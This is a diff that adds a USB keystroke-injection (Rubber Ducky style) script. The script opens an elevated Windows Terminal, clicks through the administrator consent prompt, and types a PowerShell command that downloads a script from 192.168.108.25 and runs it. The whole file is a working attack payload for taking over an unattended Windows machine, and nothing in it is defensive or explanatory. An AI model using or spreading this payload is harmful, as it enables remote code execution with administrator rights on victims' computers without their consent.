@@ -1,0 +1,14 @@
+REM TechChip Powershell Script
+Delay 5000
+GUI r
+DELAY 1000
+STRING wt
+CONTROL SHIFT ENTER
+DELAY 2500
+LEFT
+DELAY 1000
+ENTER
+DELAY 5000
+STRING IEX (New-Object
+Net.WebClient).DownloadString('http://192.168.108.25/tc.ps1');
+ENTER
